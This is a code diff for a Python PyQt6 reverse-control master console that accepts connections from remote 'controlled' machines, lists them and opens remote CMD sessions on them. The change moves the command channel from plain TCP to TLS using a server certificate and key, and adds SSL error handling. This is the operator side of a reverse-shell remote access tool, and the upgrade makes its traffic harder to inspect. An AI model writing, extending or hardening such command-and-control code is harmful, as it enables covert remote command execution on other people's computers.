@@ -1,6 +1,7 @@
 import sys
 import socket
 import threading
+import ssl
 from datetime import datetime
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                              QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
@@ -15,8 +16,8 @@ class ClientSignals(QObject):
 
 
 class ClientSession:
-    def __init__(self, conn: socket.socket, addr):
-        self.conn = conn
+    def __init__(self, ssl_conn: ssl.SSLSocket, addr):
+        self.conn = ssl_conn  # 现在是ssl包装后的socket对象
         self.addr = addr
         self.ip_str = f"{addr[0]}:{addr[1]}"
         self.last_pong = datetime.now()
@@ -33,12 +34,16 @@ class ClientSession:
             packet = header + body
             self.conn.sendall(packet)
             return True
-        except (OSError, BrokenPipeError):
+        except (OSError, BrokenPipeError, ssl.SSLError):
             self.close()
             return False
 
     def close(self):
         self.connected = False
+        try:
+            self.conn.shutdown()
+        except Exception:
+            pass
         try:
             self.conn.close()
         except Exception:
@@ -87,10 +92,8 @@ class RemoteCmdDialog(QDialog):
 
     def closeEvent(self, event):
         self.is_alive = False
-        # 关闭时发送KILL
         if self.client.connected:
             self.client.send_packet(b"KILL")
-        # 主动从主窗口字典中移除自己，避免第二次打开复用旧窗口
         if self.main_window and self.client in self.main_window.open_cmd_dialogs:
             del self.main_window.open_cmd_dialogs[self.client]
         super().closeEvent(event)
@@ -125,9 +128,10 @@ class ClientListModel(QAbstractListModel):
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("TCP反向控制端")
+        self.setWindowTitle("TLS反向控制主控端")
         self.resize(700, 500)
         self.server_sock: socket.socket | None = None
+        self.ssl_context = None
         self.server_running = False
         self.client_model = ClientListModel()
         self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}
@@ -137,10 +141,10 @@ class MainWindow(QMainWindow):
         lay = QVBoxLayout(w)
 
         top_lay = QHBoxLayout()
-        top_lay.addWidget(QLabel("监听端口:"))
+        top_lay.addWidget(QLabel("TLS监听端口:"))
         self.port_edit = QLineEdit("8888")
         top_lay.addWidget(self.port_edit)
-        self.btn_start = QPushButton("启动监听")
+        self.btn_start = QPushButton("启动TLS监听")
         self.btn_start.clicked.connect(self.start_server)
         top_lay.addWidget(self.btn_start)
         self.btn_stop = QPushButton("停止监听")
@@ -166,12 +170,20 @@ class MainWindow(QMainWindow):
     def accept_loop(self):
         while self.server_running:
             try:
-                conn, addr = self.server_sock.accept()
-                sess = ClientSession(conn, addr)
+                raw_conn, addr = self.server_sock.accept()
+                # wrap成SSL socket
+                try:
+                    ssl_conn = self.ssl_context.wrap_socket(raw_conn, server_side=True)
+                except ssl.SSLError as e:
+                    self.log(f"TLS握手失败 {addr}: {e}")
+                    raw_conn.close()
+                    continue
+
+                sess = ClientSession(ssl_conn, addr)
                 sess.signals.on_outp.connect(self.handle_session_outp)
                 sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                 self.client_model.add(sess)
-                self.log(f"新被控端接入 {sess.ip_str}")
+                self.log(f"[TLS新接入] {sess.ip_str}")
                 t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
                 t.start()
             except OSError:
@@ -187,9 +199,9 @@ class MainWindow(QMainWindow):
     def handle_session_disconnect(self, sess: ClientSession):
         if sess in self.open_cmd_dialogs:
             dlg = self.open_cmd_dialogs.pop(sess)
-            dlg.append_text("\n[!] TCP连接已经断开")
+            dlg.append_text("\n[!] TLS连接已经断开")
         self.client_model.remove_by_obj(sess)
-        self.log(f"被控端断开 {sess.ip_str}")
+        self.log(f"[断开] {sess.ip_str}")
 
     def client_recv_loop(self, sess: ClientSession):
         buf = sess._recv_buf
@@ -219,13 +231,17 @@ class MainWindow(QMainWindow):
                             out_text = output_bytes.decode("gbk", errors="replace")
                             sess.signals.on_outp.emit(sess, out_text)
 
-            except OSError:
+            except (OSError, ssl.SSLError):
                 break
         sess.close()
         sess.signals.on_disconnect.emit(sess)
 
     def start_server(self):
         port = int(self.port_edit.text())
+        # 创建TLS上下文，加载证书私钥
+        self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+        self.ssl_context.load_cert_chain(certfile="server.crt", keyfile="server.key")
+
         self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.server_sock.bind(("0.0.0.0", port))
@@ -234,7 +250,7 @@ class MainWindow(QMainWindow):
         threading.Thread(target=self.accept_loop, daemon=True).start()
         self.btn_start.setEnabled(False)
         self.btn_stop.setEnabled(True)
-        self.log(f"开始监听端口 {port}")
+        self.log(f"TLS服务端启动，监听端口 {port}")
 
     def stop_server(self):
         self.server_running = False
@@ -248,7 +264,7 @@ class MainWindow(QMainWindow):
         self.open_cmd_dialogs.clear()
         self.btn_start.setEnabled(True)
         self.btn_stop.setEnabled(False)
-        self.log("停止监听")
+        self.log("TLS监听已停止")
 
     def on_context_menu(self, pos):
         idx = self.view.indexAt(pos)
@@ -259,7 +275,6 @@ class MainWindow(QMainWindow):
         act_open_cmd = menu.addAction("打开远程CMD会话")
         ret = menu.exec(self.view.viewport().mapToGlobal(pos))
         if ret == act_open_cmd:
-            # 修复：检查旧对话框是否还存活
             if sess in self.open_cmd_dialogs:
                 dlg = self.open_cmd_dialogs[sess]
                 if dlg.isVisible():
@@ -267,9 +282,7 @@ class MainWindow(QMainWindow):
                     dlg.activateWindow()
                     return
                 else:
-                    # 旧对话框已关闭，清理字典
                     del self.open_cmd_dialogs[sess]
-            # 创建全新对话框
             dlg = RemoteCmdDialog(sess, parent=self)
             self.open_cmd_dialogs[sess] = dlg
             dlg.show()
